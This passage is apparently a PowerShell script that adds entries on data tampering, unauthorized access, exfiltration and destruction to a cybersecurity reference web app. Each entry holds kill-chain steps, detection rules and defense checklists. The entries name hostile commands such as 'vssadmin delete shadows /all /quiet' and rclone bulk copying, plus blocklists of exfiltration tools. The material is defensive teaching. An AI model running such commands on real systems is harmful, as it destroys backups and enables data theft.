    primaryTargets: "SAN/NAS Storage Arrays, Audit Logs, Transaction Ledgers, Patient Health Records, Firmware Images",
    threatActors: "Financial Fraudsters, Nation-State Saboteurs, Disgruntled Insiders",
    summary: "Data Tampering is the deliberate, unauthorized modification, alteration, or corruption of data stored at rest or in transit, compromising data integrity. Threat actors alter banking transaction records, modify ledger balances, manipulate medical diagnostic outputs, flip bits in stored system binaries, or rewrite audit logs to cover their tracks. Without cryptographic hashing or immutable WORM storage, tampering may remain undetected indefinitely.",
    killChain: [
      {
        step: 1,
        title: "Privileged Storage Share Access",
        mitre: "T1078",
        desc: "Gaining administrative access to network file storage, database storage volumes, or cloud object repositories."
      },
      {
        step: 2,
        title: "Cryptographic Hash & Audit Bypass",
        mitre: "T1565.001",
        desc: "Overwriting target data records while recalculating or modifying corresponding checksums and log entries."
      },
      {
        step: 3,
        title: "Silent State Manipulation / Fraud",
        mitre: "T1565.002",
        desc: "Altering medical prescription dosages, diverting wire routing accounts, or replacing software update binaries with trojans."
      }
    ],
    telemetry: {
      sources: [
        "File Integrity Monitoring (FIM) Logs (Tripwire, OSSEC, Wazuh file hash delta logs)",
        "Storage Array Audit Logs (NetApp, Dell EMC, Pure Storage object modification telemetry)",
        "Database Transaction Log Audits (Change Data Capture / CDC logs)"
      ],
      anomalies: [
        "FIM alerts detecting unexpected SHA-256 hash modifications on critical system or ledger files",
        "Direct block-level modification of database storage volume files (.mdf, .ibd) bypassing DBMS engine",
        "Out-of-order sequence numbering or timestamps in transactional data stores"
      ]
    },
    rules: {
      sigma: `title: Critical System File Hash Mismatch Detected via FIM
id: a4b5c6d7-8e9f-0a1b-2c3d-4e5f6a7b8c9d
status: production
description: Detects File Integrity Monitoring alerts indicating unauthorized content modification on critical system binaries.
logsource:
    category: file_integrity
detection:
    selection:
        event_type: 'modified'
        file_path|startswith:
            - '/etc/'
            - '/bin/'
            - '/usr/bin/'
            - 'C:\Windows\System32\'
    condition: selection
level: critical
tags:
    - attack.impact
    - attack.t1565.001`,
      splunk: `index=fim_alerts action="file_modified" file_path IN ("*hosts*", "*passwd*", "*shadow*", "*.dll", "*.exe")
| stats count by host, user, file_path, old_hash, new_hash
| eval Alert="CRITICAL: Unauthorized File Modification Detected by FIM (Data Tampering Risk)"
| table _time, host, user, file_path, old_hash, new_hash, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (
    msg:"SEC-ALERT Direct SMB Write Attempt to Critical System Volume Share";
    flow:to_server,established;
    content:"SMB";
    classtype:suspicious-filename-detect;
    sid:1000107;
    rev:1;
)`,
      sysmon: `# Verify file integrity monitoring status via AIDE / Wazuh:
aide --check`
    },
    defenseChecklist: [
      { id: "dtmp_1", title: "Enforce Immutable Write-Once-Read-Many (WORM) Storage", tier: "Storage Architecture", desc: "Deploy S3 Object Lock in Compliance Mode or NetApp SnapLock to guarantee stored records cannot be altered or overwritten by any user." },
      { id: "dtmp_2", title: "Real-Time File Integrity Monitoring (FIM)", tier: "Host Security", desc: "Deploy FIM agents (Wazuh, OSSEC) across all production hosts to detect and alert on any unauthorized file modifications in real time." },
      { id: "dtmp_3", title: "Cryptographic Data Signing & Merkle Trees", tier: "Application Architecture", desc: "Sign all critical database records and ledger entries using cryptographic digital signatures or tamper-evident Merkle hash trees." },
      { id: "dtmp_4", title: "Segregation of Duties for Storage Administration", tier: "Access Governance", desc: "Require dual-authorization (two-person rule) for any manual modifications to storage array LUNs, volumes, or snapshot policies." }
    ]
  },
  {
    num: 108,
    id: "unauthorized-data-access",
    name: "Unauthorized Data Access",
    shortName: "Unauthorized Data Access",
    moduleGroup: "storage",
    module: "Storage Security Attacks",
    category: "storage",
    severity: "critical",
    cvss: "9.1",
    mitre: "T1078, T1021.002, T1213",
    primaryTargets: "Network Attached Storage (NAS), SMB File Shares, Cloud Object Stores, Confidential Data Vaults",
    threatActors: "Ransomware Double-Extortionists, Corporate Spies, Rogue Contractors",
    summary: "Unauthorized Data Access occurs when individuals or processes access storage repositories, file servers, or database stores without proper authorization or by bypassing established access controls. This is facilitated by over-permissive ACLs ('Everyone: Full Control'), stolen storage access tokens (e.g. AWS STS credentials, Azure SAS tokens), or lack of network microsegmentation separating storage networks from user subnets.",
    killChain: [
      {
        step: 1,
        title: "Enterprise Share & Storage Discovery",
        mitre: "T1135",
        desc: "Scanning domain subnets using PowerView or Snaffler to discover open SMB shares, NFS exports, and cloud storage endpoints."
      },
      {
        step: 2,
        title: "Over-Permissive ACL Exploitation",
        mitre: "T1078",
        desc: "Mounting file shares using standard Domain User credentials to access folders containing executive salaries, M&A docs, and source code."
      },
      {
        step: 3,
        title: "Confidential Data Harvesting",
        mitre: "T1213",
        desc: "Accessing and reading thousands of sensitive documents without generating access control violations."
      }
    ],
    telemetry: {
      sources: [
        "Windows File Server Audit Logs (Event ID 4663 - An attempt was made to access an object)",
        "NFS / SMB Access Logs",
        "Storage Access Telemetry (Cloud IAM and blob access telemetry)"
      ],
      anomalies: [
        "Standard user account reading thousands of confidential files across diverse network shares in minutes",
        "Access to sensitive executive shares during non-business hours from anomalous workstations",
        "Use of automated file discovery tools (Snaffler, PowerView) generating bursts of share query events"
      ]
    },
    rules: {
      sigma: `title: High Volume File Read Activity Across Network Share
id: b5c6d7e8-9f0a-1b2c-3d4e-5f6a7b8c9d0e
status: production
description: Detects a single user account reading a massive number of files on a network share within a short timeframe.
logsource:
    category: file_event
    product: windows
detection:
    selection:
        EventID: 4663
        AccessMask: '0x1'
    timeframe: 5m
    condition: selection | count(ObjectName) by SubjectUserName > 200
level: high
tags:
    - attack.collection
    - attack.t1213`,
      splunk: `index=wineventlog EventCode=4663 AccessMask="0x1" ObjectName="*\\\\finance\\\\*" OR ObjectName="*\\\\legal\\\\*"
| stats count by SubjectUserName, WorkstationName, ObjectName
| where count > 50
| eval Alert="HIGH: Rapid Bulk Read of Confidential Share Objects (Unauthorized Access Indicator)"
| table _time, SubjectUserName, WorkstationName, count, Alert`,
      suricata: `alert tcp any any -> $SMB_SERVERS 445 (
    msg:"SEC-ALERT High Volume SMB Tree Connect to Multiple Shares";
    flow:to_server,established;
    content:"SMB";
    threshold: type both, track by_src, count 10, seconds 30;
    classtype:bad-unknown;
    sid:1000108;
    rev:1;
)`,
      sysmon: `# Audit Windows share permissions for 'Everyone' or 'Domain Users':
Get-SmbShareAccess -Name * | Where-Object {$_.AccountName -match "Everyone|Domain Users"}`
    },
    defenseChecklist: [
      { id: "uda_1", title: "Eliminate Over-Permissive Share ACLs (Audit with Snaffler)", tier: "Storage Access", desc: "Audit and purge 'Everyone' and 'Domain Users' read permissions from all corporate network shares; enforce strict least-privilege security groups." },
      { id: "uda_2", title: "Deploy User and Entity Behavior Analytics (UEBA)", tier: "Security Analytics", desc: "Deploy UEBA solutions to establish baseline file access patterns and automatically terminate sessions accessing anomalous volumes of files." },
      { id: "uda_3", title: "Strict Network Microsegmentation for Storage Interfaces", tier: "Network Architecture", desc: "Isolate SAN/NAS management and iSCSI/NFS storage networks behind dedicated firewalls, permitting connections only from authorized hypervisors." },
      { id: "uda_4", title: "Zero-Trust Data Access Controls with Just-in-Time Access", tier: "Identity Governance", desc: "Implement Just-In-Time (JIT) access requests requiring manager approval before granting access to confidential corporate file vaults." }
    ]
  },
  {
    num: 109,
    id: "data-exfiltration",
    name: "Data Exfiltration",
    shortName: "Data Exfiltration",
    moduleGroup: "storage",
    module: "Storage Security Attacks",
    category: "storage",
    severity: "critical",
    cvss: "9.4",
    mitre: "T1567, T1048, T1041",
    primaryTargets: "Enterprise Cloud Backups, Intellectual Property Repositories, Customer PII Databases, File Servers",
    threatActors: "LockBit, BlackCat/ALPHV, Cl0p (MOVEit exploiters), Espionage Units",
    summary: "Data Exfiltration is the unauthorized duplication, transfer, or retrieval of confidential data from a company's systems or storage volumes to an adversary-controlled external destination. Attackers stage files using compression and AES encryption (7-Zip, RAR), and transfer the data over encrypted C2 channels, DNS tunneling, or cloud storage synchronization utilities (Rclone, MegaSync, Dropbox, IPFS) to facilitate double-extortion ransomware schemes.",
    killChain: [
      {
        step: 1,
        title: "Data Staging & Encrypted Compression",
        mitre: "T1074.001",
        desc: "Aggregating targeted files into staging folders and compressing them with 7-Zip using AES-256 passwords."
      },
      {
        step: 2,
        title: "Exfiltration Tool Deployment (Rclone / Mega)",
        mitre: "T1567.002",
        desc: "Dropping cloud sync tools (rclone.exe, mega-cmd) configured with adversary cloud storage API tokens."
      },
      {
        step: 3,
        title: "High-Speed Encrypted Egress Transfer",
        mitre: "T1048",
        desc: "Siphoning hundreds of gigabytes over HTTPS to Mega.nz, Dropbox, or attacker-controlled WebDAV servers."
      }
    ],
    telemetry: {
      sources: [
        "Network Egress Firewall & NetFlow Telemetry (High-bandwidth outbound connections)",
        "Endpoint Process Execution Logs (Execution of 7z.exe, rclone.exe, megasync.exe)",
        "DNS Logs (High-frequency TXT query anomalies indicating DNS tunneling)"
      ],
      anomalies: [
        "Massive spike in outbound encrypted HTTPS bandwidth to consumer cloud storage domains (mega.nz, transfer.sh)",
        "Execution of rclone.exe with command-line arguments like 'copy --transfers=16'",
        "High volume of DNS requests containing base64 or hex encoded subdomains"
      ]
    },
    rules: {
      sigma: `title: Rclone Execution for High-Volume Cloud Data Exfiltration
id: c6d7e8f9-0a1b-2c3d-4e5f-6a7b8c9d0e1f
status: production
description: Detects command-line execution of Rclone commonly used by double-extortion ransomware gangs to exfiltrate data.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\rclone.exe'
            - '\mega-cmd.exe'
        CommandLine|contains:
            - 'copy '
            - 'sync '
            - '--config'
            - '--transfers'
    condition: selection
level: critical
tags:
    - attack.exfiltration
    - attack.t1567.002`,
      splunk: `index=network_firewall (dest_host="*mega.nz*" OR dest_host="*transfer.sh*" OR dest_host="*dropboxapi.com*") bytes_out > 500000000
| stats sum(bytes_out) as total_bytes by src_ip, dest_host
| eval total_MB=round(total_bytes/1024/1024, 2)
| eval Alert="CRITICAL: Large Volume Outbound Transfer to Cloud Storage (Potential Data Exfiltration)"
| table _time, src_ip, dest_host, total_MB, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (
    msg:"SEC-ALERT High-Volume Egress Burst to MEGA Cloud Storage";
    flow:to_server,established;
    tls.sni; content:"mega.nz";
    threshold: type both, track by_src, count 50, seconds 60;
    classtype:policy-violation;
    sid:1000109;
    rev:1;
)`,
      sysmon: `# Verify local firewall blocks unauthorized cloud storage destinations:
netsh advfirewall firewall show rule name="Block-Mega-Sync"`
    },
    defenseChecklist: [
      { id: "exf_1", title: "Block Unauthorized Cloud Storage Sync at Perimeter Proxy", tier: "Perimeter / Secure Web Gateway", desc: "Block access to consumer cloud storage domains (Mega, Dropbox, WeTransfer, Telegram API) at perimeter SWG firewalls." },
      { id: "exf_2", title: "EDR Blocklist for Exfiltration Binaries (Rclone, MegaCmd)", tier: "Endpoint Security", desc: "Blacklist and immediately terminate execution of unauthorized utilities (rclone.exe, mega-cmd.exe, plink.exe, ngrok) via EDR policies." },
      { id: "exf_3", title: "NetFlow Outbound Bandwidth Anomaly Detection", tier: "Network Monitoring", desc: "Configure NetFlow/Zeek anomaly thresholds to alert the SOC whenever internal hosts exceed 500MB of outbound traffic to unusual destinations." },
      { id: "exf_4", title: "DNS Tunneling Inspection & Deep Packet Filtering", tier: "DNS Security", desc: "Inspect DNS telemetry for high-entropy subdomains and block unauthorized external DNS resolvers to stop DNS exfiltration." }
    ]
  },
  {
    num: 110,
    id: "data-destruction",
    name: "Data Destruction",
    shortName: "Data Destruction",
    moduleGroup: "storage",
    module: "Storage Security Attacks",
    category: "storage",
    severity: "critical",
    cvss: "9.9",
    mitre: "T1485, T1490, T1561",
    primaryTargets: "Primary Storage Volumes, Volume Shadow Copies, Storage Snapshots, Hypervisor Datastores, Cloud Backups",
    threatActors: "Wiper Operators (HermeticWiper, CaddyWiper, Shamoon), Sandworm, Destructive Hacktivists",
    summary: "Data Destruction is the deliberate, irreversible rendering of data unreadable, unrecoverable, or permanently deleted. Unlike ransomware which offers a decryption key, wiper malware and destructive attackers overwrite disk Master Boot Records (MBR), overwrite files with random zeros/null bytes, purge cloud snapshots and storage bucket versioning, delete Active Directory catalogs, and zero-out SAN storage LUNs to inflict catastrophic operational downtime.",
    killChain: [
      {
        step: 1,
        title: "Backup & Recovery Mechanism Inhabitation",
        mitre: "T1490",
        desc: "Executing commands to delete volume shadow copies (vssadmin delete shadows /all /quiet), wipe backup catalogs, and disable recovery modes."
      },
      {
        step: 2,
        title: "Low-Level Raw Disk Access & Driver Loading",
        mitre: "T1068",
        desc: "Loading raw disk drivers or vulnerable signed drivers (BYOVD) to bypass OS file system locks and EDR kernel hooks."
      },
      {
        step: 3,
        title: "Irreversible Overwrite & System Brick",
        mitre: "T1561.002",
        desc: "Overwriting the Master Boot Record (MBR), wiping partition tables, and overwriting file contents with zero bytes before forcing a system crash."
      }
    ],
    telemetry: {
      sources: [
        "Endpoint Detection & Response (EDR raw disk write telemetry, Event ID 9 / 10)",
        "Windows Event Logs (System Event 7045 - Driver Installed, Security 4688 vssadmin)",
        "Storage Array Management Logs (Snapshot deletion and LUN unmapping logs)"
      ],
      anomalies: [
        "Rapid sequential deletion of all volume shadow copies via vssadmin.exe, wmic.exe, or bcdedit.exe",
        "Direct raw disk handle write operations (\\\\.\\PhysicalDrive0) initiated by non-system processes",
        "Bulk mass deletion of cloud storage snapshots or backup vaults within seconds"
      ]
    },
    rules: {
      sigma: `title: Mass Deletion of Volume Shadow Copies (Inhibit System Recovery)
id: d7e8f90a-1b2c-3d4e-5f6a-7b8c9d0e1f2a
status: production
description: Detects command-line execution targeting Volume Shadow Copies to prevent recovery prior to data destruction.
logsource:
    category: process_creation
    product: windows
detection:
    selection_vssadmin:
        Image|endswith: '\vssadmin.exe'
        CommandLine|contains|all:
            - 'delete'
            - 'shadows'
    selection_wmic:
        Image|endswith: '\wmic.exe'
        CommandLine|contains|all:
            - 'shadowcopy'
            - 'delete'
    condition: selection_vssadmin or selection_wmic
level: critical
tags:
    - attack.impact
    - attack.t1490`,
      splunk: `index=sysmon (Image="*\\\\vssadmin.exe" CommandLine="*delete shadows*") OR (Image="*\\\\bcdedit.exe" CommandLine="*recoveryenabled no*")
| eval Alert="CRITICAL: Inhibiting System Recovery - Preparation for Wiper / Ransomware Destruction"
| table _time, host, User, Image, CommandLine, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $STORAGE_SERVERS $SMB_PORTS (
    msg:"SEC-ALERT Wiper Malware Disk Overwrite Activity Indicator";
    flow:to_server,established;
    content:"\\\\.\\PhysicalDrive"; nocase;
    classtype:successful-recon-limited;
    sid:1000110;
    rev:1;
)`,
      sysmon: `# Verify Volume Shadow Copies exist:
vssadmin list shadows`
    },
    defenseChecklist: [
      { id: "dest_1", title: "Air-Gapped Immutable Offline Backup Vaults", tier: "Business Continuity", desc: "Maintain air-gapped, offline, or cloud-isolated immutable backups that cannot be modified or deleted via network APIs." },
      { id: "dest_2", title: "Block Raw Disk Access via EDR & Attack Surface Reduction (ASR)", tier: "Host Hardening", desc: "Enable Windows Defender ASR rule 'Block untrusted processes from writing to raw disk sectors' to prevent MBR/GPT wiping." },
      { id: "dest_3", title: "Multi-Party Authorization for Snapshot Deletion", tier: "Cloud / Storage", desc: "Require Multi-Party Quorum Approval (M-of-N authorization) and 30-day retention lock before storage snapshots can be pruned." },
      { id: "dest_4", title: "Automated Instant Killswitch on Backup Tampering", tier: "SOC Automation", desc: "Configure SIEM to trigger an automated network isolation killswitch on any host executing vssadmin delete shadows." }
    ]
  }
'@

$appJsPath = 'C:/Users/SubbulakshmiT/.gemini/antigravity-ide/scratch/cyber-attack-book/app.js'
$content = Get-Content -Raw -Path $appJsPath

# Target is the end of ATTACKS_DATA array:
#   }
# ];
# 
# // Application State

$targetStr = "    ]`r`n  }`r`n];`r`n`r`n// Application State"
$replacementStr = "    ]`r`n  },`r`n" + $newAttacksCode + "`r`n];`r`n`r`n// Application State"

if ($content.Contains($targetStr)) {
    $newContent = $content.Replace($targetStr, $replacementStr)
    Set-Content -Path $appJsPath -Value $newContent -NoNewline
    Write-Host "SUCCESS: Replaced targetStr and injected attacks 84-110 into app.js"
} else {
    # Try LF line endings if CRLF didn't match
    $targetStrLF = "    ]\n  }\n];\n\n// Application State"
    $replacementStrLF = "    ]\n  },\n" + ($newAttacksCode -replace "`r`n", "`n") + "\n];\n\n// Application State"
    if ($content.Contains($targetStrLF)) {
        $newContent = $content.Replace($targetStrLF, $replacementStrLF)
        Set-Content -Path $appJsPath -Value $newContent -NoNewline
        Write-Host "SUCCESS (LF): Replaced targetStr and injected attacks 84-110 into app.js"
    } else {
        Write-Host "ERROR: targetStr not found in app.js!"
    }
}
